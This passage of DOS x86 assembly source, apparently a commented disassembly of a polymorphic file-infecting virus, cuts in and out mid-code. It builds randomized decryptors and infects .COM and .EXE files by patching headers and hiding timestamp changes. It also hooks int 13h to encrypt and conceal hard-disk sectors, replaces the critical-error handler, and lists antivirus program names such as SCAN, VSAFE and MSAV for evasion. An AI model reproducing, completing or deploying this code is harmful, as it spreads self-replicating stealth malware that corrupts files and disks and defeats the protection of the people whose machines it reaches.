m_i_?		dw	offset mov_index_? - p	; 0b34h	; 0b9ch	; 061ah
x_?_i_		dw	offset xor_?_instr - p	; 0b3dh	; 0b9eh	; 061ch
i_?_i		dw	offset inc_?_instr - p	; 0b44h	; 0ba0h	; 061eh
c_i_?		dw	offset cmp_index_? - p	; 0b47h	; 0ba2h	; 0620h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; This sets rite ModR/M instructions ....
; There are two phases here:
; 1. : m_?_i - a_?_i = sets instruction that worx with xor_reg
; 2. : m_i_? - c_i_? = sets instruction that worx with index_reg
; in : dl = random_number that depends on phase
; Just go through it and try to know what's happening here :)
sub_0BA4	proc	near
loc_0BA4:
		lodsw
		xchg	di, ax
		mov	al, dl
		cmp	si, offset i_?_i - p
		jne	short loc_0BB6
		and	al, 5
		cmp	al, 1
		jne	short loc_0BC6
		mov	al, 7
loc_0BB6:
		cmp	si, offset a_?_i - p
		jne	short loc_0BC6
		mov	cl, 3
		shl	al, cl
		or	[di], al
		or	al, 0C7h
		jmp	short loc_0BCA
loc_0BC6:
		or	[di], al
		or	al, 0F8h
loc_0BCA:
		and	[di], al
		cmp	si, offset m_i_? - p
		je	short loc_ret_0BDA
		cmp	si, offset sub_0BA4 - p
		je	short loc_ret_0BDA
		jmp	short loc_0BA4

loc_ret_0BDA:
		retn
sub_0BA4	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz preparez decode_routine ...
sub_0BDB	proc	near
		mov	dx, 2
		call	random_number		; gimme random_number
		mov	byte ptr ds:[push_what - p], 0Eh; store push_cs
		or	dx, dx			; random_number nullovy ?
		jz	short loc_0BEF
		mov	byte ptr ds:[push_what - p], 16h; nope so store
						; push_ss
loc_0BEF:
		mov	si, offset m_?_i - p	; start with first_phaze
loc_0BF2:
		mov	dx, 8
		call	random_number		; gimme random_number
		cmp	dl, 4			; we don't need sp_reg
		je	loc_0BF2
		mov	bl, dl			; reg 2 bl
		call	sub_0BA4		; set instructionz etc.
		mov	si, offset m_i_? - p	; start with second_phaze
loc_0C05:
		mov	dx, 3
		call	random_number		; gimme random_number
		add	dl, 6
		cmp	dl, 8
		jne	short loc_0C15
		mov	dl, 3			; yope set bx_reg
loc_0C15:
		cmp	dl, bl			; xor_reg = index_reg ?
		je	loc_0C05
		call	sub_0BA4		; nope so set instr. etc.
		xor	cx, cx
		mov	di, offset decode_routine_table - p
loc_0C21:
		cmp	cx, 9			; jnz_instruction ?
		jne	short loc_0C40
loc_0C26:					; yope
						; it'z jnz disp8
						; so it must be in the range
						; 0 - 80h bytez
		mov	dx, 0C8h
		call	random_number		; gimme random_number
		sub	dx, 64h			; sub 0c8h / 2
		add	dx, ds:[xor_offset - p]	; add xor_offset
		cmp	dx, 0			; less than 0 ?
		jl	loc_0C26
		cmp	dx, ds:[max_number - p]	; more or same than max_number?
		jge	loc_0C26
		jmp	short loc_0C46
loc_0C40:
		db	0bah			; mov	dx, ?
max_number	dw	466h			; random_max iz max_number
		call	random_number		; gimme random_number
loc_0C46:
		jcxz	short loc_0C5F		; first timez here ?
		mov	si, offset decode_routine_table - p
		push	cx			; nope
locloop_0C4C:					; so go2 cur_instr and check
						; 4 distancez
		lodsw
		sub	ax, dx			; check 4 distance
		cmp	ax, 0Ah			; more or same than 0ah bytez ?
		jge	loc_0C5C
		cmp	ax, 0FFF6h		; less or same than 0ah bytez ?
		jle	loc_0C5C
		pop	cx			; nope ! get another random_#
		jmp	loc_0C21
loc_0C5C:					; yope
		loop	locloop_0C4C		; so go2 next insrt
		pop	cx			; last_one
loc_0C5F:
		xchg	dx, ax			; random_number 2 ax
		stosw				; store it 2 decode_...
		inc	cx			; inc counter
		cmp	cx, 0Ah			; less than 0ah (10 piecez) ?
		jb	loc_0C21
						; nope = decode_routine_table
						; initialized ...
		mov	bx, offset decode_routine_table - p
		mov	si, offset instr_start - p
loc_0C6D:
		mov	di, offset instr_buffer - p
		lodsb				; read instr_length
		mov	cl, al			; instr_length 2 cx
		mov	dx, 8			; u_instr 2 dx
		sub	dx, cx			; sub it
		mov	ax, [bx+2]		; gimme next_d_entry_offset
						; if jnz_instr next iz
						; viruz_beginning ...
		sub	ax, [bx]		; sub from it cur_d_entry
		cmp	ax, 0Ah			; distance 0ah ?
		jne	short loc_0C8B
		inc	dx			; inc u_instr (we don't need
		inc	dx			; jmp_instr ...)
		call	sub_0B72
		inc	bx			; go2 next decode_routine_
		inc	bx			; _offset
		jmp	short loc_0CB5		; and go on
loc_0C8B:					; nope
		call	random_number		; gimme random_number
		call	sub_0B72		; copy instruction 2 buffer ...
		mov	dx, di			; gimme instr_buffer_offset
		sub	dx, offset three_bytez - p; sub ofs instr_buffer - 3
		add	dx, [bx]		; add cur_d_entry
		mov	al, 0E9h		; far_jmp 2 al
		stosb				; store it
		inc	bx			; go2 next_entry
		inc	bx
		mov	ax, [bx]		; gimme it
		sub	ax, dx			; sub it
		cmp	ax, 7Eh			; distance more than 7eh ?
		jg	short loc_0CB4
		cmp	ax, 0FF7Fh		; distance less than 0ff7fh ?
		jl	short loc_0CB4
		inc	ax			; nope inc distance (jmp_short
						; only 2 bytez ...)
		mov	byte ptr [di-1], 0EBh	; store rather jmp_short
		stosb				; store disp8
		jmp	short loc_0CB5		; and go on
loc_0CB4:					; yope
		stosw				; store disp16
loc_0CB5:
		push	bx
		push	cx
		db	0b9h			; mov	cx, 0
mov_cx_?_	dw	0			; gimme file_pointer
		db	0bah			; mov	dx, 13h
mov_dx_?_	dw	13h
		add	dx, [bx-2]		; add decode_table_entry
		adc	cx, 0			; (the current)
		push	cx
		push	dx
		call	sub_0E63		; go2 f_ptr
		mov	cx, 0Ah			; read 0ah bytez
		db	0bah			; mov	dx, ?
buffer_offset	dw	0a4h			; 2 [buffer_offset]
		add	ds:[buffer_offset - p], cx; go2 next_buffer_offset_entry
		call	f_read_
		pop	dx
		pop	cx
		jc	short loc_0CE6		; error ?
		call	sub_0E63		; go back 2 f_ptr
		xchg	cx, di			; cur_instr_buffer_offset 2 cx
		mov	dx, offset instr_buffer - p; sub offset instr_buffer
		sub	cx, dx			; sub it 2 get instr_size
		call	f_write_		; and write it ...
loc_0CE6:
		pop	cx
		pop	bx
		jc	short loc_ret_0CF3	; error ?
		db	81h,0FBh		; cmp bx, offset beginning_ofs - p
		dw	offset beginning_ofs - p
		jnc	short loc_ret_0CF3	; last decode_routine_entry ?
		jmp	loc_0C6D		; nope so go on ...

loc_ret_0CF3:					; yope
		retn				; so end ...
sub_0BDB	endp

; Purpose of moving to buffer:
; while writing viruz_body to file, the virus crypts viruz_body so
; int_13h and crypt_routine and routine that writes it to file
; far far away from range of crypt_routine
presun_rutiny:
		mov	cx, offset buffer - p	; gimme size 2 write
		xor	dx, dx			; start with offset null
		call	sub_0D12		; crypt_ it
		mov	ah, 40h			; write crypted_ viruz_body
		mov	bx, ds:[handle - p]	; 2 file; gimme handle
		pushf				; and
		db	9Ah			; call far ptr old_int_21h
old_int_21h	dw	0, 0
		jc	short loc_0D0C		; error ?
		cmp	ax, cx			; written_&_wanted the same ?
loc_0D0C:
		pushf				; push flagz
		call	sub_0D12		; decrypt_ viruz_body
		popf				; restore flagz
		retn				; and end ...

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz cryptz_ viruz_body
sub_0D12	proc	near
		push	cx
		mov	si, dx			; gimme viruz_start_offset
		db	0b8h			; mov	ax, 0
crypt_viruz	dw	0			; gimme init_crypt_vale
		mov	cx, offset buffer - p	; gimme viruz_size

locloop_0D1B:
		xor	[si], ax		; crypt_it
		db	05h			; add	ax, ?
next_crypt_value	dw	0		; go2 next_crypt_value
		inc	si			; go2 next viruz_byte
		loop	locloop_0D1B		; and go on

		pop	cx
		retn				; and end ...
sub_0D12	endp

new_int_24h:
		mov	al, 3
		iret

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz callz old_int_13h
sub_0D28	proc	near
		pushf
		call	dword ptr cs:[old_int_13h - p__]
		retn
sub_0D28	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz getz cylinder_number in si
sub_0D2F	proc	near
		push	cx
		push	dx
		shr	cl, 1
		shr	cl, 1
		and	dh, 0C0h
		or	dh, cl
		mov	cl, 4
		shr	dh, cl
		mov	dl, ch
		xchg	si, dx
		pop	dx
		pop	cx
		retn
sub_0D2F	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz cryptz_ a buffer
crypt_		proc	near
		push	ax
		push	bx			; push regz
		push	cx
		db	0b0h			; mov	al, ?
secz_count	db	0			; gimme secz_count
		db	0bbh			; mov	bx, ?
buf_ptr		dw	0			; gimme buf_ptr
loc_0D4D:
		mov	cx, 100h		; do it 256*
						; (in wordz)
locloop_0D50:
		db	26h, 81h, 37h		; xor	word ptr es:[bx], ?
crypt_value	dw	2b50h			; xor word ...
		inc	bx			; go2 next_word in buffer
		inc	bx
		loop	locloop_0D50		; and go on

		dec	al			; dec secz_count
		jnz	loc_0D4D		; last one ?
		pop	cx			; yope
		pop	bx			; restore regz
		pop	ax
		retn				; and end ...
crypt_		endp


new_int_13h:
		cmp	ah, 2			; read sector(z) ?
		je	short loc_0D6E
		cmp	ah, 3			; write sector(z) ?
		je	short loc_0D6E
		jmp	loc_0E50		; nope so end
loc_0D6E:
		cmp	dx, 80h			; 0.head, first_harddisk ?
		jne	short loc_0DE0
		test	cx, 0FFC0h		; cylinder is null ?
		jnz	short loc_0DE0
		push	bx			; ok it could be work with
		push	dx			; partition_table or with
		push	si			; viruz_body
		push	di
		push	cx
		push	cx
		mov	si, ax			; gimme ax_reg
		and	si, 0FFh		; gimme secz_2_work
		mov	di, si
		mov	al, 1
		push	ax
		jz	short loc_0DBB		; secz_2_work is null ?
		jcxz	short loc_0DDB		; sec_number is null ?
		cmp	cl, 1			; work with parition_table ?
		je	short loc_0DCD
loc_0D94:					; nope so it could be viruz
		db	80h, 0f9h		; body
max_sektor	db	11h			; cmp	cl, ?
		ja	short loc_0DDB		; are we in the range
		db	80h, 0f9h		; cmp	cl, ?
partition_sec_n	db	0ah			; where'z viruz_body ?
		jb	short loc_0DD2
		cmp	ah, 3			; yope = writing ?
		je	short loc_0DDB		; (end_with error)
		push	bx
		mov	cx, 200h		; do it 512*

locloop_0DA7:
		mov	byte ptr es:[bx], 0	; store null
		inc	bx			; inc buffer_ptr
		loop	locloop_0DA7		; and go on ...

		pop	bx
loc_0DAF:
		add	bx, 200h		; go2 next_sec_in_buffer
		pop	ax
		pop	cx
		inc	cx			; inc sec_number
		push	cx
		push	ax
		dec	si			; dec secz_2_work
		jnz	loc_0D94		; null ?
loc_0DBB:
		clc
loc_0DBC:					; yope
		pop	ax			; restore ax_reg
		pushf
		xchg	di, ax			; secz_2_work 2 ax
		sub	ax, si			; sub secz_that_weren't_read
		popf
		mov	ah, ch			; error number 2 ah
		pop	cx
		pop	cx
		pop	di			; restore regz
		pop	si
		pop	dx
		pop	bx
		retf	2			; and end ...
loc_0DCD:
		mov	cl, byte ptr cs:[partition_sec_n - p__]	; yope
						; so gimme parition_table_sec
loc_0DD2:
		call	sub_0D28		; write or read it
		mov	ch, ah			; gimme possible_error_number
		jc	loc_0DBC		; error ?
		jmp	short loc_0DAF		; nope = go on
loc_0DDB:					; yope
		stc				; so set up error_flag
		mov	ch, 0BBh		; and error_number 2 ch
		jmp	short loc_0DBC		; (undefined_error)
loc_0DE0:					; nope
		cmp	dl, 80h			; it'z first_harddisk ?
		jne	short loc_0E50
		push	ax
		push	cx
		push	dx
		push	si			; push regz
		push	ds
		push	cs
		pop	ds
		mov	byte ptr ds:[secz_count - p__], 0	; store null
		mov	word ptr ds:[buf_ptr - p__], bx	; store bx
		call	sub_0D2F		; gimme cylinder_number
		and	cl, 3Fh			; voklesti sector
		and	dh, 3Fh			; voklesti head
loc_0DFE:
		or	al, al			; secz_2_work is null ?
		jz	short loc_0E31
		db	81h, 0feh		; cmp	si, ?
max_cyl_number	dw	265h			; are we in the range
		jae	short loc_0E31		; where'z harddisk
		db	81h, 0feh		; cmp	si, ?
cur_cyl_number	dw	1234h			; crypted_ ?
		jb	short loc_0E14
		inc	byte ptr ds:[secz_count - p__]	; yope inc secz_count
		jmp	short loc_0E1A
loc_0E14:
		add	word ptr ds:[buf_ptr - p__], 200h; go2 next_sec_in_buf
loc_0E1A:
		dec	al			; dec secz_2_work
		inc	cl
		db	80h, 0f9h		; cmp	cl, ?
max_sektor_2	db	11h			; sector in range ?
		jbe	loc_0DFE
		mov	cl, 1			; nope so sector 2 1
		inc	dh			; and inc head
		db	80h, 0feh		; cmp	dh, ?
max_heads	db	07h			; head in range ?
		jbe	loc_0DFE
		xor	dh, dh			; nope so head 2 null
		inc	si			; and inc cylinder
		jmp	short loc_0DFE		; and go on
loc_0E31:					; yope
		cmp	byte ptr ds:[secz_count - p__], 0; must we (un)crypt_
		pop	ds			; something ?
		pop	si			; restore regz
		pop	dx
		pop	cx
		pop	ax
		jz	short loc_0E50
		cmp	ah, 2			; yope; read ?
		je	short loc_0E45
		call	crypt_			; nope write; crypt_ it
loc_0E45:
		call	sub_0D28		; do it
		pushf
		call	crypt_			; and uncrypt_ it
		popf
		retf	2
loc_0E50:					; end ...
		db	0EAh			; jmp far ptr old_int_13h
old_int_13h	label	near


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz writez 2 file ...
f_write_	proc	near
		mov	ah, 40h
		jmp	$ + 4
f_write_	endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz readz from file ...
f_read_	proc	near
		mov	ah, 3Fh			; '?'
		call	sub_0E6F
		jc	short loc_ret_0E5E
		cmp	ax, cx

loc_ret_0E5E:
		retn
f_read_	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz call f_ptr fc
sub_0E5F	proc	near
		xor	cx, cx
		mov	dx, cx
sub_0E63:
		mov	ax, 4200h
		jmp	short loc_0E6F
sub_0E68:
		xor	cx, cx
		mov	dx, cx
sub_0E6C:
		mov	ax, 4202h
sub_0E6F:
loc_0E6F:
		mov	bx, word ptr cs:[handle - p]

; Diz call old_int_21h
int_21h:
		pushf
		cli
		call	dword ptr cs:[old_int_21h - p__]
		retn
sub_0E5F	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz infectz the file ...
sub_0E7C	proc	near
		mov	bp, sp
		mov	ax, 5700h		; gimme file_time_&_date
		call	sub_0E6F
		mov	bx, offset file_time_date - p
		mov	[bx], cx		; store time_stamp
		mov	[bx+2], dx		; store date_stamp
		call	sub_1157		; file already infected ?
		jc	short loc_0F0A
		mov	dx, 1Eh
		call	random_number		; gimme random_number
		or	dx, dx			; null ?
		jz	short loc_0E9D
		mov	[bx], ax		; nope so store new_time_stamp
loc_0E9D:
		mov	word ptr ds:[buffer_offset - p], offset overwritten_bytez - p
		mov	dx, 0FFFFh
		push	dx
		call	random_number		; gimme random_number
		mov	ds:[crypt_viruz_value - p], dx	; store it
		mov	ds:[crypt_viruz - p__], dx	; store it
		pop	dx
		call	random_number		; gimme next_random_number
		mov	ds:[next_crypt_value_ - p], dx	; store it
		mov	ds:[next_crypt_value - p__], dx	; store it
		call	sub_0E5F		; go2 sof
		mov	cx, 1Ah			; read 1ah_bytez
		mov	dx, offset file_buffer - p; 2 file_buffer
		push	dx			; (exe_hdr or 3bytez from com)
		call	f_read_			; read it
		jc	short loc_0F24		; error ?
		xchg	si, dx			; move these
		mov	di, offset exe_header - p
		rep	movsb			; bytez
		call	sub_0E68		; go2 eof
		mov	si, ax			; size in ax : dx
		mov	di, dx			; 2 si : di
		pop	bx
		cmp	word ptr [bx], 4D5Ah	; 'MZ' ?
		je	short loc_0EFA		; it'z exe_file ?
		cmp	word ptr [bx], 5A4Dh	; 'ZM' ?
		je	short loc_0EFA		; it'z exe_file ?
		mov	byte ptr ds:[exe_flag - p], 0; nope = clear exe_flag
		cmp	ax, 0EFA6h		; file not 2 big ?
		cmc
		jc	short loc_0F24
		mov	ax, 3			; nope
		cwd				; null dx_reg
		push	bx
		jmp	short loc_0F16
loc_0EFA:
		mov	byte ptr ds:[exe_flag - p], 1	; set up exe_flag
		mov	ax, [bx+4]		; gime page_cnt
		mul	word ptr ds:[page_size_ - p]	; mul it with page_size
		sub	ax, si
		sbb	dx, di
loc_0F0A:
		jc	short loc_0F24
		mov	ax, [bx+8]		; gimme hdr_size
		mul	word ptr ds:[hdr_size_ - p]	; mul it with hdr_size
		push	bx
		push	ax
		push	dx
loc_0F16:
		sub	si, ax			; sub hdr_size
		sbb	di, dx			; or 3 bytez 4 far_jmp
		or	di, di			; file bigger than 0ffffh bytez ?
		jnz	short loc_0F2C
		mov	dx, si			; nope
		sub	dx, 3E8h		; so check whether the file
loc_0F24:					; iz not 2 small
		jc	short loc_0F98
		cmp	dx, 7D0h		; size less than 7d0h ?
		jbe	short loc_0F2F
loc_0F2C:
		mov	dx, 7D0h		; set max_number 2 7d0h
loc_0F2F:
		call	random_number		; gimme random_number
		add	dx, 3E8h		; add 7d0h / 2
		mov	ds:[viruz_start - p], dx	; store viruz_start
		add	dx, offset buffer - p + 280h	; add dx viruz_size
							; + space 4 stack
		cmp	byte ptr ds:[exe_flag - p], 0	; exe_file ?
		je	short loc_0F49
		mov	ds:[file_buffer - p + 10h], dx	; yope store new exe_sp
loc_0F49:
		add	dx, 0FD80h		; sub 280h
		mov	ds:[viruz_end - p], dx	; store viruz_end
		add	dx, 0 - (offset buffer - offset loc_08d1)
		mov	ds:[beginning_ofs - p], dx; store beginning_ofs
		add	dx, 0 - (offset loc_08d1 - offset loc_0582) - 9
		mov	ds:[max_number - p], dx	; store max_number
		add	dx, 8			; add 8 (viz up - 9 ...)
		not	dx			; make signed_number
		mov	cx, 0FFFFh		; the f_ptr functionz
						; are signed
						; so it will sub from the eof
						; cx : dx ...
		call	sub_0E6C
		mov	ds:[mov_cx_?_ - p], dx	; store new_file_poz
		mov	ds:[mov_dx_?_ - p], ax	; as a base ...
		cmp	byte ptr ds:[exe_flag - p], 0	; com_file ?
		jne	short loc_0F81
		xchg	dx, ax			; gimme base
		add	dx, 100h		; add 100h
		jmp	short loc_0F8B		; and go on
loc_0F81:
		pop	di
		pop	si
		sub	ax, si			; count base_addr
		sbb	dx, di
		div	word ptr ds:[hdr_size_ - p]
loc_0F8B:
		add	ds:[viruz_start - p], dx; add base
		add	ds:[viruz_end - p], dx	; add base
		push	ax
		push	dx
		call	sub_0BDB		; ok now prepare decode_rout...
loc_0F98:
		jc	short loc_0FFE		; error ?
		pop	dx			; and now add base
		pop	ax			; 2 decode_routine_table_
		mov	cx, 0Ah			; _entryz ...
		mov	si, offset decode_routine_table - p

locloop_0FA2:
		add	[si], dx		; add base
		inc	si			; go2 next_entry
		inc	si
		loop	locloop_0FA2		; and go on ...

		pop	bx
		cmp	byte ptr ds:[exe_flag - p], 0	; com_file ?
		jne	short loc_0FD0
		mov	byte ptr [bx], 0E9h	; store far_jump
		mov	ax, ds:[decode_routine_table - p]; gimme jump_offset
		sub	ax, 103h		; sub 103h (100h PSP and 03h
						; far_jmp)
		mov	[bx+1], ax		; store it
		mov	word ptr ds:[relo_cnt - p], 0; store relo_cnt
		mov	word ptr ds:[relo_cs - p], 0FFF0h; store relo_cs
		mov	word ptr ds:[exe_ip - p], 100h; store exe_ip
		jmp	short loc_0FF7		; and go on
loc_0FD0:					; nope exe_file
		mov	[bx+16h], ax		; store relo_cs
		mov	[bx+0Eh], ax		; store relo_ss
		mov	ax, ds:[decode_routine_table - p]; gimme starting_ofs
		mov	[bx+14h], ax		; store exe_ip
		add	[bx+10h], dx		; add it 2 exe_sp
		mov	word ptr [bx+6], 0	; null relo_cnt
		mov	ax, 28h			; my_min_mem 2 ax
		cmp	[bx+0Ah], ax		; compare it with min_mem
		jae	short loc_0FEF		; more ?
		mov	[bx+0Ah], ax		; yope so store my_min_mem
loc_0FEF:
		cmp	[bx+0Ch], ax		; compare it with max_mem
		jae	short loc_0FF7		; more ?
		mov	[bx+0Ch], ax		; yope so store my_max_mem
loc_0FF7:
		push	bx
		call	sub_0E68		; go2 eof
		db	0e8h			; call presun_rutiny (
						; viruz_body_crypt_&_write)
		dw	offset presun_rutiny - presun_rutiny + buffer - next___
next___		label	near			; crypt_ it and write it
loc_0FFE:
		jc	short loc_1031
		call	sub_0E68		; go2 eof
		div	word ptr ds:[page_size_ - p]	; div new_file_size
		inc	ax			; 2 count pagez
		pop	bx
		cmp	byte ptr ds:[exe_flag - p], 0	; exe_file ?
		je	short loc_1016
		mov	[bx+4], ax		; store new page_cnt
		mov	[bx+2], dx		; store new part_pag
loc_1016:
		push	bx
		call	sub_0E5F		; go2 sof
		mov	cx, 1Ah
		pop	dx
		call	f_write_		; write new_exe_header 2 file
		jc	short loc_1031		; error ?
		mov	ax, 5701h		; set back file_time_date
		mov	cx, ds:[file_time_date - p]	; gimme time_stamp
		mov	dx, ds:[file_time_date - p + 2]	; gimme date_stamp
		call	sub_0E6F		; set it
loc_1031:
		mov	sp, bp
		retn				; and end ...
sub_0E7C	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz setz my own error_handler
sub_1034	proc	near
		push	dx
		push	ds
		push	cs
		pop	ds
		mov	ax, 3524h		; gimme old_int_24h
		call	int_21h
		mov	ds:[old_int_24h - p + 2], es	; store it
		mov	ds:[old_int_24h - p], bx
		mov	ax, 2524h		; and set my own
		mov	dx, offset new_int_24h - p__	; handler
		call	int_21h
		pop	ds
		pop	dx
		retn				; and end ...
sub_1034	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz setz back old_int_24h
sub_1052	proc	near
		mov	ax, 2524h
		lds	dx, dword ptr cs:[old_int_24h - p]; gimme old_int_24h
		call	int_21h			; set it back
		retn				; and end ...
sub_1052	endp

_com_		db	04h, '.COM'		; offset 105eh
_exe_		db	04h, '.EXE'		; offset 1063h
_scan_		db	04h, 'SCAN'		; offset 1068h
_clean_		db	05h, 'CLEAN'		; offset 106dh
_findviru_	db	08h, 'FINDVIRU'		; offset 1073h
_guard_		db	05h, 'GUARD'		; offset 107ch
_nod_		db	03h, 'NOD'		; offset 1082h
_vsafe_		db	05h, 'VSAFE'		; offset 1086h
_msav_		db	04h, 'MSAV'		; offset 108ch
_chkdsk_	db	06h, 'CHKDSK'		; offset 1091h
		
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz checkz the file_name and drive ...
sub_1098	proc	near
		push	dx
		push	bx
		push	cx
		push	si
		push	di			; push regz
		push	ds
		push	es
		push	ax
		mov	si, dx			; gimme file_name_offset
		mov	di, name_buffer - p	; gimme buffer where 2 store
		push	cs
		pop	es
		lea	bx, [di-1]
		mov	cx, 4Bh			; try it 4bh*

locloop_10AD:
		lodsb				; read byte
		cmp	al, 61h			; 'a'
		jb	short loc_10B8		; low_case ?
		cmp	al, 7Ah			; 'z'
		ja	short loc_10B8
		sub	al, 20h			; yope so make high_case
loc_10B8:
		push	ax
		push	si
loc_10BA:					; nope
		cmp	al, 20h			; space ?
		jne	short loc_10C7
		lodsb				; read byte
		or	al, al			; null ?
		jnz	loc_10BA
		pop	si			; yope
		pop	si
		jmp	short loc_10D7		; end ...
loc_10C7:
		pop	si
		pop	ax
		cmp	al, 5Ch			; '\'
		je	short loc_10D5
		cmp	al, 2Fh			; '/'
		je	short loc_10D5
		cmp	al, 3Ah			; ':'
		jne	short loc_10D7
loc_10D5:
		mov	bx, di			; store offset 2 bx
loc_10D7:
		stosb				; store byte
		or	al, al			; null ?
		jz	short loc_10DE
		loop	locloop_10AD		; and go on

loc_10DE:					; yope
		mov	si, offset _com_ - p	; check 4 .COM or .EXE
		sub	di, 5			; sub 5 (.XXX, 0)
		push	cs
		pop	ds
		call	sub_1149		; it'z .COM ?
		jz	short loc_10F0
		call	sub_1149		; it'z .EXE ?
		jnz	short loc_113C
loc_10F0:					; yope
		pop	ax
		push	ax
		xchg	di, bx			; gimme file_name_offset
		inc	di			; inc it (/, \, or : ...)
		cmp	ax, 4B00h		; fc run file ?
		jne	short loc_1107
		mov	si, offset _chkdsk_ - p
		call	sub_1149		; do we run CHKDISK ?
		jnz	short loc_1107
		mov	byte ptr ds:[fcb_jmp_ - p], offset loc_121a - (fcb_jmp_ + 1)
